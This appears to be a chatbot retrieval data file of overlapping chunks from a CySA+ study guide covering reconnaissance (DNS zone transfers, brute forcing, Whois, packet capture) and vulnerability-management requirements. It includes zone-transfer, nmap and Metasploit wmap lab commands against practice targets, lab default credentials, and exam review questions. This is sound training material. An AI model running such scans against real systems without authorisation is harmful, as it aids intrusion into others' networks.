rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	manages the DNS Root Zone, which handles the assignments of both gTLDs and ccTLDs. Regional authority over these resources is handled by five regional Internet registries (RIRs): ■■ African Network Information Center (AFRINIC) for Africa Passive Discovery ■■ ■■ ■■ ■■ 187 American Registry for Internet Numbers (ARIN) for the United States, Canada, parts of the Caribbean region, and Antarctica Asia-­Pacific Network Information Centre (APNIC) for Asia, Australia, New Zealand, and other countries in the region Latin America and Caribbean Network Information Centre (LACNIC) for Latin America and parts of the Caribbean not covered by ARIN Réseaux IP Européens Network Coordination Centre (RIPE NCC) for Central Asia, Europe, the Middle East, and Russia Each of the RIRs provides Whois services to identify the assigned users of the IP space they are responsible for, as well as other services that help to ensure that the underlying IP and DNS foundations of the Internet function for their region. You may encounter autonomous system (AS) numbers when you’re gathering information about an organization. AS numbers are assigned by RIRs to network operators as part of the routing infrastructure of the Internet. For our purposes, the AS number typically isn’t a critical piece of information. DNS Entries In addition to the information provided using nslookup, DNS entries can provide useful information about systems simply through the hostname. A system named “AD4” is a more likely target for Active Directory–based exploits and Windows Server–specific scans, whereas hostnames that reflect a specific application or service can provide both target information and a clue for social engineering and human intelligence activities. DNS Discovery External DNS information for an organization is provided as part of its Whois information, providing a good starting place for DNS-­based information gathering. Additional DNS servers may be identified either as part of active scanning or passive information gathering based on network traffic or logs, or even by reviewing an organization’s documentation. This can be done using a port scan and searching for systems that provide DNS services on UDP or TCP port 53. Once you have found a DNS server, you can query it using dig or other DNS lookup commands, or you can test it to see if it supports zone transfers, which can make acquiring organizational DNS data easy. Zone Transfers One way to gather information about an organization is to perform a zone transfer. Zone transfers are intended to be used to replicate DNS databases between DNS servers, which makes them a powerful information-­gathering tool if a target’s DNS servers allow a zone transfer. This means that most DNS servers are set to prohibit zone transfers to servers that 188 Chapter 5 ■ Reconnaissance and Intelligence Gathering aren’t their trusted DNS peers, but security analysts, penetration testers, and attackers are still likely to check to see if a zone transfer is possible. To check if your DNS server allows zone transfers from the command line, you can use either host or dig: host –t axfr domain.name dns-­ server dig axfr
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	used to replicate DNS databases between DNS servers, which makes them a powerful information-­gathering tool if a target’s DNS servers allow a zone transfer. This means that most DNS servers are set to prohibit zone transfers to servers that 188 Chapter 5 ■ Reconnaissance and Intelligence Gathering aren’t their trusted DNS peers, but security analysts, penetration testers, and attackers are still likely to check to see if a zone transfer is possible. To check if your DNS server allows zone transfers from the command line, you can use either host or dig: host –t axfr domain.name dns-­ server dig axfr @dns-­ server domain.name Running this against a DNS server that allows zone transfers will result in a large file with data like the following dump from DigiNinja, a site that allows practice zone transfers for security practitioners: ; <<>> DiG 9.9.5-­ 12.1-­ Debian <<>> axfr @nsztm1.digi.ninja zonetransfer.me ; (1 server found) ;; global options: +cmd zonetransfer.me. 7200 IN SOA nsztm1.digi.ninja. robin.digi.ninja. 2014101603 172800 900 1209600 3600 zonetransfer.me. 7200 IN RRSIG SOA 8 2 7200 20160330133700 20160229123700 44244 zonetransfer.me. GzQojkYAP8zuTOB9UAx66mTDiEGJ26hVIIP2 ifk2DpbQLrEAPg4M77i4 M0yFWHpNfMJIuuJ8nMxQgFVCU3yTOeT/EMbN98FYC8lVYwEZeWHtb MmS 88jVlF+cOz2WarjCdyV0+UJCTdGtBJriIczC52EXKkw2RCkv3gtdKKVa fBE= zonetransfer.me. 7200 IN NS nsztm1.digi.ninja. zonetransfer.me. 7200 IN NS nsztm2.digi.ninja. zonetransfer.me. 7200 IN RRSIG NS 8 2 7200 20160330133700 20160229123700 44244 zonetransfer.me. TyFngBk2PMWxgJc6RtgCE/RhE0kqeWfwhYS BxFxezupFLeiDjHeVXo+S WZxP54Xvwfk7jlFClNZ9lRNkL5qHyxRElhlH1JJI1hjvod0fycq LqCnx XIqkOzUCkm2Mxr8OcGf2jVNDUcLPDO5XjHgOXCK9tRbVVKIpB92f4Qal ulw= zonetransfer.me. 7200 IN A 217.147.177.157 This transfer starts with a start of authority (SOA) record, which lists the primary name server; the contact for it, robin.digi.ninja (which should be read as robin@digi .ninja); and the current serial number for the domain, 2014101603. It also provides the time secondary name servers should wait between changes: 172,800 seconds, the time a primary name server should wait if it fails to refresh; 900 seconds, the time in seconds that a secondary name server can claim to have authoritative information; 1,209,600 seconds, the expiration of the record (two weeks); and 3,600 seconds, the minimum TTL for the domain. Both of the primary name servers for the domain are also listed—­nsztm1 and nsztm2—­and MX records and other details are contained in the file. These details, plus the full list of DNS entries for the domain, can be very useful when gathering information about an organization, and they are a major reason that zone transfers are turned off for most DNS servers. DigiNinja provides DNS servers that allow zone transfers to demonstrate how dangerous this can be. You can try out domain zone transfers using the domain zonetransfer.me with name servers nsztm1.digi.ninja and nsztm2.digi.ninja. Full details of how to read the file are also available at http://digi.ninja/projects/zonetransferme.php. Passive Discovery 189 DNS Brute Forcing If a zone transfer isn’t possible, DNS information can still be gathered from public DNS by brute force. Simply sending a manual or scripted DNS query for each IP address that the organization uses can provide a useful list of systems. This can be partially prevented by using an IDS or IPS with a rule that will prevent DNS brute-­force attacks. Sending queries at a slow rate or from a number
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	using the domain zonetransfer.me with name servers nsztm1.digi.ninja and nsztm2.digi.ninja. Full details of how to read the file are also available at http://digi.ninja/projects/zonetransferme.php. Passive Discovery 189 DNS Brute Forcing If a zone transfer isn’t possible, DNS information can still be gathered from public DNS by brute force. Simply sending a manual or scripted DNS query for each IP address that the organization uses can provide a useful list of systems. This can be partially prevented by using an IDS or IPS with a rule that will prevent DNS brute-­force attacks. Sending queries at a slow rate or from a number of systems can bypass most prevention methods. Whois Whois, as mentioned earlier, allows you to search databases of registered users of domains and IP address blocks, and it can provide useful information about an organization or individual based on their registration information. In the sample Whois query for Google shown in Figure 5.19, you can see that information about Google, such as the company’s headquarters location, contact information, and its primary name servers, is returned by the Whois query. This information can provide you with additional hints about the organization by looking for other domains registered with similar information, email addresses to contact, and details you can use during the information-­gathering process. F I G U R E 5 . 19 Whois query data for google.com 190 Chapter 5 ■ Reconnaissance and Intelligence Gathering Other information can be gathered by using the host command in Linux. This command will provide information about a system’s IPv4 and IPv6 addresses as well as its email servers, as shown in Figure 5.20. FIGURE 5.20 host command response for google.com It can also be useful to know the history of domain ownership for a domain when conducting reconnaissance. Various services like the Domain Tools history service (https://research.domaintools.com/ research/whois-­history) provide a historical view of the domain registration information provided by Whois. Many domain owners reduce the amount of visible data after their domains have been registered for some time, meaning that historical domain registration information can be a treasure trove of useful details. Information Aggregation and Analysis Tools A variety of tools can help with aggregating and analyzing information gathering. Examples include theHarvester, a tool designed to gather emails, domain information, hostnames, employee names, and open ports and banners using search engines; Maltego, which builds relationship maps between people and their ties to other resources; and the Shodan search engine for Internet-­connected devices and their vulnerabilities. Using a tool like theHarvester can help simplify searches of large datasets, but it’s not a complete substitute for a human’s creativity. Information Gathering Using Packet Capture A final method of passive information gathering requires access to the target network. This means that internal security teams can more easily rely on packet capture as a tool, whereas penetration testers (or attackers!) typically have to breach an organization’s security to capture network traffic. Packet capture utilities are also often called sniffers or packet analyzers. Passive Discovery 191 Once you have
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	and the Shodan search engine for Internet-­connected devices and their vulnerabilities. Using a tool like theHarvester can help simplify searches of large datasets, but it’s not a complete substitute for a human’s creativity. Information Gathering Using Packet Capture A final method of passive information gathering requires access to the target network. This means that internal security teams can more easily rely on packet capture as a tool, whereas penetration testers (or attackers!) typically have to breach an organization’s security to capture network traffic. Packet capture utilities are also often called sniffers or packet analyzers. Passive Discovery 191 Once you have access, however, packet capture can provide huge amounts of useful information. A capture from a single host can tell you what systems are on a given network by capturing broadcast packets, and OS fingerprinting can give you a good guess about a remote host’s operating system. If you are able to capture data from a strategic location in a network using a network tap or span port, you’ll have access to far more network traffic, and thus even more information about the network. In Figure 5.21, you can see filtered packet capture data during an nmap scan. Using packet capture can allow you to dig into specific responses or to verify that you did test a specific host at a specific time. Thus, packet capture can be used both as an analysis tool and as proof that a task was accomplished. FIGURE 5.21 Packet capture data from an nmap scan Exam Note The CySA+ exam objectives focus on a handful of tools for network scanning and mapping as well as a “multipurpose” listing. You may find it easier to ignore the categories the outline places them in and to remember the tools based on what they do and how they are most often used: ■■ ■■ ■■ ■■ Angry IP Scanner is a fast port scanner, but you’re far more likely to use nmap in most environments. Nmap is the most commonly used port scanner and is a tool you should focus on as you learn commonly used utilities. Maltego is an open source intelligence tool that is useful for data mining and link analysis, among other uses. Recon-­ng is another open source intelligence gathering tool. Chapter 5 192 ■ Reconnaissance and Intelligence Gathering (continued) ■■ ■■ The Metasploit Framework (MSF) includes many other tools, but is particularly useful for scanning, exploitation, and penetration testing activities. You’ll want to make sure you know what each tool is, and it can help to have some basic experience with each tool as well. Nmap and Metasploit are both commonly used tools and are especially worth additional time and familiarization. Summary Asset discovery is a critical part of understanding environments. Both active and passive methods can be used to gather information about what devices, systems, and services exist on a network. Understanding how scans can be used to map devices as well as how devices can be fingerprinted to identify unique devices and
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	scanning, exploitation, and penetration testing activities. You’ll want to make sure you know what each tool is, and it can help to have some basic experience with each tool as well. Nmap and Metasploit are both commonly used tools and are especially worth additional time and familiarization. Summary Asset discovery is a critical part of understanding environments. Both active and passive methods can be used to gather information about what devices, systems, and services exist on a network. Understanding how scans can be used to map devices as well as how devices can be fingerprinted to identify unique devices and to determine what they are and what operating systems they are running is important to cybersecurity practitioners. Knowing where data that can help with asset discovery exists on systems and devices can help practitioners identify systems, devices, and services. Asset discovery takes many forms and techniques due to security controls, network topography and design, and other limiting factors that can require additional efforts beyond a simple port scan. Key tools for practitioners include port scanners like nmap and the Angry IP Scanner, as well as tools that support information gathering and reconnaissance efforts like Maltego and Recon-­ng. Multiuse tools like the Metasploit Framework build many of these capabilities into their toolset, allowing practitioners to pivot from information gathering and analysis to exploit or other activities. As a security practitioner, you need to understand how to gather information and perform device fingerprinting and network mapping through port and vulnerability scanning, log review, passive information gathering, and organizational intelligence gathering. You should also be familiar with tools like nmap, the Angry IP Scanner, Maltego, the Metasploit Framework, and Recon-­ng for the exam. Together these skills will provide you with the abilities you need to understand the networks, systems, and other organizational assets that you must defend. Exam Essentials Explain how active reconnaissance is critical to asset discovery and mapping. Active reconnaissance involves probing systems and networks for information. Port scanning is a frequent first step during reconnaissance, and nmap is a commonly used tool for system, port, OS, and service discovery for part scanning. Active reconnaissance can also help determine network topology by capturing information and analyzing responses from network devices Lab Exercises 193 and systems. It is important to know common port and service pairings to help with analyzing and understanding discovered services. Know how passive discovery provides information without active probes. Passive discovery relies on data gathered without probing systems and networks. Log files, configuration files, and published data from DNS and Whois queries can all provide valuable data without sending any traffic to a system or network. Packet capture is useful when working to understand a network and can help document active reconnaissance activities as well as providing diagnostic and network data. Assess data from common tools. Tools like the Angry IP Scanner and nmap can be used for asset discovery and mapping. Maltego and Recon-­ng are useful for mapping and organizing open source intelligence as well as reconnaissance
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	probes. Passive discovery relies on data gathered without probing systems and networks. Log files, configuration files, and published data from DNS and Whois queries can all provide valuable data without sending any traffic to a system or network. Packet capture is useful when working to understand a network and can help document active reconnaissance activities as well as providing diagnostic and network data. Assess data from common tools. Tools like the Angry IP Scanner and nmap can be used for asset discovery and mapping. Maltego and Recon-­ng are useful for mapping and organizing open source intelligence as well as reconnaissance data. The Metasploit Framework includes both information-­gathering and exploit tools as well as other functions. Understand the uses of these tools, their basic functionality, and how to read output from them. Explain asset discovery and device fingerprinting. Asset discovery helps organizations identify what they have on their networks and what services are exposed on systems and devices. Understanding topology, operating systems, services, and hosts is important to ensuring you have an accurate map of the network. Network mapping scans, operating system and service detection and their accuracy, and topological information like time to live all play a part in this process. Lab Exercises Activity 5.1: Port Scanning In this exercise, you will use a Kali Linux virtual machine to: ■■ Perform a port scan of a vulnerable system using nmap. ■■ Identify the remote system’s operating system and version. ■■ Capture packets during the port scan. Part 1: Set up virtual machines Information on downloading and setting up the Kali Linux and Metasploitable virtual machines can be found in the introduction of this book. You can also substitute your own system if you have one already set up to run nmap. 1. Boot the Kali Linux and Metasploitable virtual machines and log into both. The username/password pair for Kali Linux is kali/kali, and Metasploitable uses msfadmin/msfadmin. 2. Run ifconfig from the console of the Metasploitable virtual machine. Take note of the IP address assigned to the system. Chapter 5 194 ■ Reconnaissance and Intelligence Gathering Part 2: Perform a port scan Now we will perform a port scan of the Metasploitable virtual machine. Metasploitable is designed to be vulnerable, so we should anticipate seeing many services that might not otherwise be available on a properly secured Linux system. 1. Open a Terminal window using the menu bar at the top of the screen. 2. To run nmap, type nmap and the IP address of the target system. Use the IP address of the Metasploitable system: nmap [target IP]. What ports are open and what services are identified? Do you believe that you have identified all the open ports on the system? 3. Now we will identify the operating system of the Metasploitable virtual machine. This is enabled using the –O flag in nmap. Rerun your nmap, but this time type nmap –O [target IP] and add –p 1-­65535 to capture all possible ports. Which operating system and version is the
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	of the screen. 2. To run nmap, type nmap and the IP address of the target system. Use the IP address of the Metasploitable system: nmap [target IP]. What ports are open and what services are identified? Do you believe that you have identified all the open ports on the system? 3. Now we will identify the operating system of the Metasploitable virtual machine. This is enabled using the –O flag in nmap. Rerun your nmap, but this time type nmap –O [target IP] and add –p 1-­65535 to capture all possible ports. Which operating system and version is the Metasploitable virtual machine running? Which additional ports showed up? Activity 5.2: Device Fingerprinting In this exercise you will fingerprint devices using nmap’s built-­in OS identification tools. 1. Repeat the scan described in Activity 5.1, using nmap -­ o [target IP]. 2. Validate the response. Does it match the Metasploitable virtual machine or other target’s operating system? 3. Repeat the scan against other devices if possible. If you are on your own network, you might scan other devices like your TV, home automation devices, or your router. If you are not on a network you control, you can download and run other virtual machines to test this capability. 4. Consider what you know about device fingerprinting. What would make it less effective or impossible? Activity 5.3: Use the Metasploit Framework to Conduct a Scan The Metasploit Framework includes a variety of vulnerability scanning tools. In this exercise you will leverage one of those tools to gain some basic familiarity with it. As you prepare for the exam, you may want to try other Metasploit tools and modules. Offensive Security’s Metasploit Unleashed site found at www.offensive-­security.com/ metasploit-­unleashed covers the tool in greater depth. Lab Exercises This lab assumes you have the virtual machines described in Activity 5.1 running. 1. Open the Metasploit Framework. 2. At the msf> prompt enter load wmap. 3. Add your target virtual machine using wmap_sites -­ a http:// [target machine address]. 4. Set it as a target using wmap_targets -­ t http://[target machine address]. 5. Run wmap using the command wmap_run -­e. 6. Check for output using wmap_vulns -­l. 195 Chapter 5 196 ■ Reconnaissance and Intelligence Gathering Review Questions 1. 2. 3. 4. 5. Megan wants to use the Metasploit Framework to conduct a web application vulnerability scan. What module from the following list is best suited to her needs? A. smb_login B. Angry IP C. nmap D. wmap What flag does nmap use to enable operating system identification? A. –os B. –id C. –O D. –osscan What command-­line tool can be used to determine the path that traffic takes to a remote system? A. Whois B. traceroute C. nslookup D. routeview Valerie wants to use a graphical interface to control nmap and wants to display her scans as a visual map to help her understand her target networks. What tool from the following list should she use? A. Angry IP Scanner B. wmap C. Zenmap D.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	to her needs? A. smb_login B. Angry IP C. nmap D. wmap What flag does nmap use to enable operating system identification? A. –os B. –id C. –O D. –osscan What command-­line tool can be used to determine the path that traffic takes to a remote system? A. Whois B. traceroute C. nslookup D. routeview Valerie wants to use a graphical interface to control nmap and wants to display her scans as a visual map to help her understand her target networks. What tool from the following list should she use? A. Angry IP Scanner B. wmap C. Zenmap D. nmap-­gs Susan runs an nmap scan using the following command: nmap -­ O -­ Pn 192.168.1.0/255 What information will she see about the hosts she scans? A. The hostname and service ports B. The hostname, service ports, and operating system C. The hostname and operating system D. The hostname, uptime, and logged-­in user Review Questions 6. 7. 8. 9. 197 Tuan wants to gather additional information about a domain that he has entered in Maltego. What functionality is used to perform server-­based actions in Maltego? A. A worker B. A query C. A transform D. A scan Laura wants to conduct a search for hosts using Recon-­ng but wants to leverage a search engine with API access to acquire existing data. What module should she use? A. recon/companies-­multi/whois_miner B. import/nmap C. recon/domains-­hosts/shodan_hostname D. import/list After running an nmap scan, Geoff sees ports 80 and 443 open on a system he scanned. What reasonable guess can he make about the system based on this result? A. The system is a Windows system. B. The system is running a database server. C. The system is a Linux system. D. The system is running a web server. What information is used to identify network segments and topology when conducting an nmap scan? A. IP addresses B. Hostnames C. Time to live D. Port numbers 10. Murali wants to scan a network using nmap and has run a scan without any flags without discovering all of the hosts that he thinks should show. What scan flag can he use to scan without performing host discovery that will also determine if services are open on the systems? A. -­sn B. -­PS C. -­Pn D. -­sL 11. Jaime is using the Angry IP Scanner and notices that it supports multiple types of pings to identify hosts. Why might she choose to use a specific type of ping over others? A. To bypass firewalls B. To allow better vulnerability detection C. To prevent the scan from being flagged by DDoS protection tools D. To leverage the faster speed of TCP pings over UDP pings Chapter 5 198 ■ Reconnaissance and Intelligence Gathering 12. Hue wants to perform network footprinting as part of a reconnaissance effort. Which of the following tools is best suited to passive footprinting given a domain name as the starting point for her efforts? A. Traceroute B. Maltego C. Nmap D. Angry IP Scanner
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Why might she choose to use a specific type of ping over others? A. To bypass firewalls B. To allow better vulnerability detection C. To prevent the scan from being flagged by DDoS protection tools D. To leverage the faster speed of TCP pings over UDP pings Chapter 5 198 ■ Reconnaissance and Intelligence Gathering 12. Hue wants to perform network footprinting as part of a reconnaissance effort. Which of the following tools is best suited to passive footprinting given a domain name as the starting point for her efforts? A. Traceroute B. Maltego C. Nmap D. Angry IP Scanner 13. Jack wants to scan a system using the Angry IP Scanner. What information does he need to run the scan? A. The system’s IP address B. The system’s Whois data C. The system’s MAC address D. The system administrator’s username and password 14. Which of the following is not a reason that security professionals often perform packet capture while conducting port and vulnerability scanning? A. Work process documentation B. To capture additional data for analysis C. To prevent external attacks D. To provide a timeline 15. What process uses information such as the way that a system’s TCP stack responds to queries, what TCP options it supports, and the initial window size it uses? A. Service identification B. Fuzzing C. Application scanning D. OS detection 16. Li wants to use Recon-­ng to gather data from systems. Which of the following is not a common use for Recon-­ng? A. Conducting vulnerability scans of services B. Looking for sensitive files C. Conducting OSINT gathering of Whois, DNS, and similar data D. Finding target IP addresses 17. Jason wants to conduct a port scan using the Metasploit Framework. What tool can he use from the framework to do this? A. Angry IP Scanner B. Recon-­ng C. Maltego D. Nmap Review Questions 199 18. Sally wants to use operating system identification using nmap to determine what OS a device is running. Which of the following is not a datapoint used by nmap to identify operating systems? A. TCP sequences B. TCP timestamps C. TCP OS header D. TCP options 19. Chris wants to perform network-­based asset discovery. What limitation will he encounter if he relies on a port scanner to perform his discovery? A. Port scanners cannot detect vulnerabilities. B. Port scanners cannot determine what services are running on a given port. C. Firewalls can prevent port scanners from detecting systems. D. A port scanner can create a denial-­of-­service condition for many modern systems. 20. Emily wants to gather open source intelligence and centralize it using an open source tool. Which of the following tools is best suited to managing the collection of data for her OSINT efforts? A. The Metasploit Framework B. Recon-­ng C. nmap D. Angry IP Scanner Vulnerability Management DOMAIN II Chapter 6 Designing a Vulnerability Management Program THE COMPTIA CYBERSECURITY ANALYST (CYSA+) EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: ✓✓ Domain 2.0: Vulnerability Management ■■ 2.1 Given a scenario,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Firewalls can prevent port scanners from detecting systems. D. A port scanner can create a denial-­of-­service condition for many modern systems. 20. Emily wants to gather open source intelligence and centralize it using an open source tool. Which of the following tools is best suited to managing the collection of data for her OSINT efforts? A. The Metasploit Framework B. Recon-­ng C. nmap D. Angry IP Scanner Vulnerability Management DOMAIN II Chapter 6 Designing a Vulnerability Management Program THE COMPTIA CYBERSECURITY ANALYST (CYSA+) EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: ✓✓ Domain 2.0: Vulnerability Management ■■ 2.1 Given a scenario, implement vulnerability scanning methods and concepts ■■ ■■ Special considerations ■■ Internal vs. external scanning ■■ Agent vs. agentless ■■ Credentialed vs. non-­credentialed ■■ Passive vs. active ■■ Security baseline scanning ■■ Industry frameworks 2.2 Given a scenario, analyze output from vulnerability assessment tools ■■ Web application scanners ■■ Vulnerability scanners ■■ Cloud infrastructure assessment tools Cybersecurity is a cat-­and-­mouse game where information technology professionals seek to combat the new vulnerabilities discovered by adversaries on an almost daily basis. Modern enterprises consist of hardware and software of almost unfathomable complexity, and buried within those systems are thousands of undiscovered security vulnerabilities waiting for an attacker to exploit them. Vulnerability management programs seek to identify, prioritize, and remediate these vulnerabilities before an attacker exploits them to undermine the confidentiality, integrity, or availability of enterprise information assets. Effective vulnerability management programs use an organized approach to scanning enterprise assets for vulnerabilities, using a defined workflow to remediate those vulnerabilities and performing continuous assessment to provide technologists and managers with insight into the current state of enterprise cybersecurity. Identifying Vulnerability Management Requirements As an organization begins developing a vulnerability management program, it should first undertake the identification of any internal or external requirements for vulnerability scanning. These requirements may come from the regulatory environments in which the organization operates, and/or they may be internal policy-­driven requirements. Regulatory Environment Many organizations find themselves bound by laws and regulations that govern the ways they store, process, and transmit different types of data. This is especially true when the organization handles sensitive personal information or information belonging to government agencies. Many of these laws are not overly prescriptive and do not specifically address the implementation of a vulnerability management program. For example, the Health Insurance Portability and Accountability Act (HIPAA) regulates the ways that healthcare providers, insurance companies, and their business associates handle protected health information (PHI). Similarly, the Gramm–Leach–Bliley Act (GLBA) governs how financial institutions handle customer financial records. Neither of these laws specifically requires that covered organizations conduct vulnerability scanning. Identifying Vulnerability Management Requirements 205 Two regulatory schemes, however, do specifically mandate the implementation of a vulnerability management program: the Payment Card Industry Data Security Standard (PCI DSS) and the Federal Information Security Management Act (FISMA). Payment Card Industry Data Security Standard (PCI DSS) PCI DSS prescribes specific security controls for merchants who handle credit card transactions and service providers who assist merchants with
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	insurance companies, and their business associates handle protected health information (PHI). Similarly, the Gramm–Leach–Bliley Act (GLBA) governs how financial institutions handle customer financial records. Neither of these laws specifically requires that covered organizations conduct vulnerability scanning. Identifying Vulnerability Management Requirements 205 Two regulatory schemes, however, do specifically mandate the implementation of a vulnerability management program: the Payment Card Industry Data Security Standard (PCI DSS) and the Federal Information Security Management Act (FISMA). Payment Card Industry Data Security Standard (PCI DSS) PCI DSS prescribes specific security controls for merchants who handle credit card transactions and service providers who assist merchants with these transactions. This standard includes what are arguably the most specific requirements for vulnerability scanning of any standard. Contrary to what some believe, PCI DSS is not a law. The standard is maintained by an industry group known as the Payment Card Industry Security Standards Council (PCI SSC), which is funded by the industry to maintain the requirements. Organizations are subject to PCI DSS due to contractual requirements rather than a law. PCI DSS prescribes many of the details of vulnerability scans. These include the following: ■■ ■■ ■■ ■■ ■■ Organizations must run both internal and external vulnerability scans. Organizations must run scans at least once every three months (quarterly) and “after any significant change.” Internal scans must be conducted by qualified personnel. Organizations must remediate any high-­risk vulnerabilities and repeat scans to confirm that they are resolved until they receive a “clean” scan report. External scans must be conducted by an Approved Scanning Vendor (ASV) authorized by PCI SSC. Vulnerability scanning for PCI DSS compliance is a thriving and competitive industry, and many security consulting firms specialize in these scans. Many organizations choose to conduct their own scans first to assure themselves that they will achieve a passing result before requesting an official scan from an ASV. You should never conduct vulnerability scans unless you have explicit permission to do so. Running scans without permission can be a serious violation of an organization’s security policy and may also be a crime. Federal Information Security Management Act (FISMA) The Federal Information Security Management Act (FISMA) requires that government agencies and other organizations operating on behalf of government agencies comply with a series of security standards. The specific controls required by these standards depend on whether the government designates the system as low impact, moderate impact, or high impact, according to the definitions shown in Figure 6.1. Further guidance on system 206 Chapter 6 ■ Designing a Vulnerability Management Program classification is found in Federal Information Processing Standard (FIPS) 199: Standards for Security Categorization of Federal Information and Information Systems. FIGURE 6.1 FIPS 199 Standards Source: FIPS 199 / U.S Department of Commerce / Public Domain All federal information systems, regardless of their impact categorization, must meet the basic requirements for vulnerability scanning found in NIST Special Publication 800-­53: Security and Privacy Controls for Federal Information Systems and Organizations. These require that each organization subject to FISMA do the following:
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	to the definitions shown in Figure 6.1. Further guidance on system 206 Chapter 6 ■ Designing a Vulnerability Management Program classification is found in Federal Information Processing Standard (FIPS) 199: Standards for Security Categorization of Federal Information and Information Systems. FIGURE 6.1 FIPS 199 Standards Source: FIPS 199 / U.S Department of Commerce / Public Domain All federal information systems, regardless of their impact categorization, must meet the basic requirements for vulnerability scanning found in NIST Special Publication 800-­53: Security and Privacy Controls for Federal Information Systems and Organizations. These require that each organization subject to FISMA do the following: a. Monitor and scan for vulnerabilities in the system and hosted applications and, when new vulnerabilities potentially affecting the system are identified, report them. Identifying Vulnerability Management Requirements b. 207 Employ vulnerability scanning tools and techniques that facilitate interoperability among tools and automate parts of the vulnerability management process by using standards for: 1. Enumerating platforms, software flaws, and improper configurations 2. Formatting checklists and test procedures 3. Measuring vulnerability impact c. Analyze vulnerability scan reports and results from vulnerability monitoring. d. Remediate legitimate vulnerabilities in accordance with an organizational assessment of risk. e. Share information obtained from the vulnerability scanning process and security control assessments to help eliminate similar vulnerabilities in other information systems (i.e., systemic weaknesses or deficiencies). f. Employ vulnerability monitoring tools that include the capability to readily update the vulnerabilities to be scanned. These requirements establish a baseline for all federal information systems. Corporate Policy The prescriptive security requirements of PCI DSS and FISMA cover organizations involved in processing retail transactions and operating government systems, but those two groups constitute only a fraction of enterprises. Cybersecurity professionals widely agree that vulnerability management is a critical component of any information security program, and for this reason, many organizations mandate vulnerability scanning in corporate policy, even if this requirement is not imposed by regulatory requirements. Industry Standards Security professionals should draw upon the work of others when creating security standards for their organizations. These standards include controls that reduce the likelihood that vulnerabilities will exist in an organization’s environment, position the organization to better detect vulnerabilities that do occur, and mitigate the risk posed by undetected vulnerabilities. Center for Internet Security (CIS) The Center for Internet Security (CIS) publishes a series of security benchmarks that represent the consensus opinions of a series of subject matter experts. These benchmarks provide detailed configuration instructions for a variety of operating systems, applications, and devices. 208 Chapter 6 ■ Designing a Vulnerability Management Program These industry security benchmarks provide organizations with a great starting point for their own system configuration efforts. Beginning with a solid foundation saves countless hours of work and provides a secure starting point for an organization’s customized security standards. International Organization for Standardization (ISO) The International Organization for Standardization (ISO) also publishes a set of standards related to information security. ISO 27001 describes a standard approach for setting up an information security management system, while ISO 27002 goes
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	provide detailed configuration instructions for a variety of operating systems, applications, and devices. 208 Chapter 6 ■ Designing a Vulnerability Management Program These industry security benchmarks provide organizations with a great starting point for their own system configuration efforts. Beginning with a solid foundation saves countless hours of work and provides a secure starting point for an organization’s customized security standards. International Organization for Standardization (ISO) The International Organization for Standardization (ISO) also publishes a set of standards related to information security. ISO 27001 describes a standard approach for setting up an information security management system, while ISO 27002 goes into more detail on the specifics of information security controls. These internationally recognized standards are widely used within the security field, and organizations may choose to become officially certified as compliant with ISO 27001. Open Web Application Security Project (OWASP) One of the best resources for secure coding practices is the Open Web Application Security Project (OWASP). OWASP is the home of a broad community of developers and security practitioners, and it hosts many community-­developed standards, guides, and best practice documents, as well as a multitude of open source tools. OWASP provides a regularly updated list of significant vulnerabilities and proactive controls that is useful to review not only as a set of useful best practices, but also as a way to see how web application security threats change from year to year. The most recent version of the OWASP Top Ten web application vulnerabilities list (updated in 2021) includes the following vulnerabilities: ■■ Broken access control ■■ Cryptographic failures ■■ Injection ■■ Insecure design ■■ Security misconfiguration ■■ Vulnerable and outdated components ■■ Identification and authentication failures ■■ Software and data integrity failures ■■ Security logging and monitoring failures ■■ Server-­side request forgery Vulnerability scanners are often configured to use the OWASP vulnerability list as a core reference when conducting scans of web applications. Exam Note The exam expects you to know the purpose and differences between the various industry frameworks, including PCI DSS, CIS, OWASP, and the ISO 27000 series. Be sure you know them well. Identifying Vulnerability Management Requirements 209 Identifying Scan Targets Once an organization decides that it wishes to conduct vulnerability scanning and determines which, if any, regulatory requirements apply to their scans, they move on to the more detailed phases of the planning process. The next step is to identify the systems that will be covered by the vulnerability scans. Some organizations choose to cover all systems in their scanning process whereas others scan systems differently (or not at all) depending on the answers to many different questions, including: ■■ What is the data classification of the information stored, processed, or transmitted by the system? ■■ Is the system exposed to the Internet or other public or semipublic networks? ■■ What services are offered by the system? ■■ Is the system a production, test, or development system? Organizations also use automated techniques to identify the systems that may be covered by a scan. Cybersecurity
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	be covered by the vulnerability scans. Some organizations choose to cover all systems in their scanning process whereas others scan systems differently (or not at all) depending on the answers to many different questions, including: ■■ What is the data classification of the information stored, processed, or transmitted by the system? ■■ Is the system exposed to the Internet or other public or semipublic networks? ■■ What services are offered by the system? ■■ Is the system a production, test, or development system? Organizations also use automated techniques to identify the systems that may be covered by a scan. Cybersecurity professionals use scanning tools to search the network for connected systems, whether they were previously known or unknown, and build an asset inventory. Figure 6.2 shows an example of an asset map developed using a vulnerability scanner’s asset inventory functionality. FIGURE 6.2 Asset map Administrators may then supplement this inventory with additional information about the type of system and the information it handles. This information then helps make 210 Chapter 6 ■ Designing a Vulnerability Management Program determinations about which systems are critical and which are noncritical. Asset inventory and asset criticality information helps guide decisions about the types of scans that are performed, the frequency of those scans, and the priority administrators should place on remediating vulnerabilities detected by the scan. Scheduling Scans Cybersecurity professionals depend on automation to help 